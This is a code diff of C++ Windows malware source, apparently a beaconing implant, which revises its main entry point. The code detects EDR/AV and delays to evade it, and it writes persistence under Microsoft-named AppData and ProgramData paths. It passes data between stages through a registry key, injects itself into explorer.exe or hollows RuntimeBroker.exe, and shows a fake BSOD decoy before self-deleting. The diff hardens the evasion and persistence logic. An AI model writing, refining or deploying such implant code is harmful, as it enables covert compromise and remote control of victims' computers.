@@ -43,20 +43,22 @@ namespace {
         std::wstring svchost = utils::DecryptW(kSvchostEnc, 11);
         std::wstring runtimeBroker = utils::DecryptW(kRuntimeBrokerEnc, 17);
 
-        for (auto& c : explorer) c = (wchar_t)::towlower(c);
-        for (auto& c : svchost) c = (wchar_t)::towlower(c);
-        for (auto& c : runtimeBroker) c = (wchar_t)::towlower(c);
+        std::wstring lowerPath = sPath;
+        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);
 
-        if (sPath.find(explorer) != std::wstring::npos) return true;
-        if (sPath.find(svchost) != std::wstring::npos) return true;
-        if (sPath.find(runtimeBroker) != std::wstring::npos) return true;
+        if (lowerPath.find(explorer) != std::wstring::npos) return true;
+        if (lowerPath.find(svchost) != std::wstring::npos) return true;
+        if (lowerPath.find(runtimeBroker) != std::wstring::npos) return true;
         return false;
     }
 
     bool IsRunningFromPersistLocation(const std::wstring& sPath) {
-        if (sPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
-            sPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
-            if (sPath.find(L"\\temp\\") == std::wstring::npos && sPath.find(L"\\tmp\\") == std::wstring::npos) {
+        std::wstring lowerPath = sPath;
+        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);
+
+        if (lowerPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
+            lowerPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
+            if (lowerPath.find(L"\\temp\\") == std::wstring::npos && lowerPath.find(L"\\tmp\\") == std::wstring::npos) {
                 return true;
             }
         }
@@ -73,18 +75,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     wchar_t currentPathBuf[MAX_PATH];
     GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
     std::wstring currentPath(currentPathBuf);
-    for (auto& c : currentPath) c = (wchar_t)::towlower(c);
 
     LOG_INFO("--- WINMAIN ---");
-    LOG_INFO("Process: " + utils::ws2s(currentPath));
+    LOG_INFO("Process Path: " + utils::ws2s(currentPath));
 
     // Priority 1: Check if we are a Foothold (injected/hollowed)
     if (IsSystemProcess(currentPath)) {
-        LOG_INFO("ROLE: Foothold.");
-        LOG_INFO("Path matched system process. Initiating beaconing...");
+        LOG_INFO("Detected Role: Foothold (Injected)");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-        if (FAILED(hr)) return 1;
+        (void)hr;
 
+        // Try to establish persistence from IPC path if available
         wchar_t dropperPath[MAX_PATH] = {0};
         HKEY hKey;
         std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
@@ -92,15 +93,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD sz = sizeof(dropperPath);
             if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
-                LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
-                Sleep(5000); // Short delay before persistence
+                LOG_INFO("Foothold IPC: Source path found: " + utils::ws2s(dropperPath));
                 persistence::establishPersistence(dropperPath);
             }
             RegCloseKey(hKey);
         } else {
+            LOG_INFO("Foothold IPC: Source path not found. Checking existing persistence...");
             persistence::ReinstallPersistence();
         }
-        LOG_INFO("Starting beacon loop...");
+
+        LOG_INFO("Foothold: Starting beacon loop...");
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
@@ -109,9 +111,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     // Priority 2: Check if we are running from a persisted location
     if (IsRunningFromPersistLocation(currentPath)) {
-        LOG_INFO("ROLE: Persisted.");
+        LOG_INFO("Detected Role: Persisted");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-        if (FAILED(hr)) return 1;
+        (void)hr;
+
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
@@ -119,55 +122,60 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 
     // ROLE: Dropper
-    LOG_INFO("ROLE: Dropper.");
+    LOG_INFO("Detected Role: Dropper");
 
-    // EDR/AV Detection and Delay only for dropper
+    // Behavioral Evasion
     int jitter = evasion::Detection::GetJitterDelay();
     if (jitter > 0) {
-        LOG_WARN("EDR/AV detected. Sleeping for " + std::to_string(jitter) + "s");
+        LOG_WARN("Evasion: EDR/AV detected. Jitter delay: " + std::to_string(jitter) + "s");
         Sleep(jitter * 1000);
     } else {
-        Sleep(10000 + (GetTickCount() % 10000));
+        Sleep(5000 + (GetTickCount() % 5000));
     }
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    if (FAILED(hr)) return 1;
+    (void)hr;
 
-    // Dropper Instance IPC: Store self path for foothold
-    HKEY hKey;
-    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
-    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        if (RegSetValueExW(hKey, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
-             LOG_INFO("IPC: Stored path successfully.");
-        }
-        RegCloseKey(hKey);
+    // 1. Establish Persistence immediately from dropper
+    LOG_INFO("Dropper: Establishing initial persistence...");
+    std::wstring persistedPath = persistence::establishPersistence();
+    if (persistedPath.empty()) {
+        LOG_ERR("Dropper: Persistence failed.");
+    } else {
+        LOG_INFO("Dropper: Persistence established at " + utils::ws2s(persistedPath));
     }
 
+    // 2. Store self path for Foothold IPC
+    HKEY hKeyIPC;
+    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
+    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKeyIPC, NULL) == ERROR_SUCCESS) {
+        RegSetValueExW(hKeyIPC, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
+        RegCloseKey(hKeyIPC);
+    }
+
+    // 3. Attempt Relocation (Injection/Hollowing)
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
-        LOG_INFO("Attempting stealth relocation...");
+        LOG_INFO("Dropper: Attempting in-memory relocation...");
 
-        // Strategy 1: Inject into explorer.exe (Most stable)
+        // Try explorer.exe first
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Injection success. Waiting for foothold...");
-            decoy::ShowBSOD();
-            LOG_INFO("Decoy exit. Cleaning up dropper.");
+            LOG_INFO("Dropper: Injection successful. Relocating to Foothold.");
+            decoy::ShowBSOD(); // Show decoy before cleaning up
             CoUninitialize();
             utils::SelfDeleteAndExit();
             return 0;
         }
 
-        // Strategy 2: Hollow RuntimeBroker.exe
-        LOG_WARN("Injection failed. Trying RuntimeBroker hollowing...");
+        // Try RuntimeBroker.exe hollowing
         wchar_t systemPath[MAX_PATH];
         GetSystemDirectoryW(systemPath, MAX_PATH);
         std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
         std::wstring target = std::wstring(systemPath) + L"\\" + rb;
 
-        LOG_INFO("Hollowing target: " + utils::ws2s(target));
         if (evasion::Injector::HollowProcess(target, selfImage)) {
-            LOG_INFO("Relocation successful.");
+            LOG_INFO("Dropper: Hollowing successful. Relocating to Foothold.");
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
@@ -175,15 +183,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    LOG_WARN("Relocation failed completely. Launching stable copy.");
-    std::wstring persistPath = persistence::establishPersistence();
-    if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
-        LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
+    // 4. Fallback: If relocation failed, ensure the persisted copy is running
+    LOG_WARN("Dropper: Relocation failed. Ensuring persisted copy is active.");
+    if (!persistedPath.empty() && lstrcmpiW(currentPathBuf, persistedPath.c_str()) != 0) {
         STARTUPINFOW si; PROCESS_INFORMATION pi;
         RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
-        if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        if (CreateProcessW(persistedPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            LOG_INFO("Stable copy launched.");
+            LOG_INFO("Dropper: Persisted copy launched.");
         }
     }
 
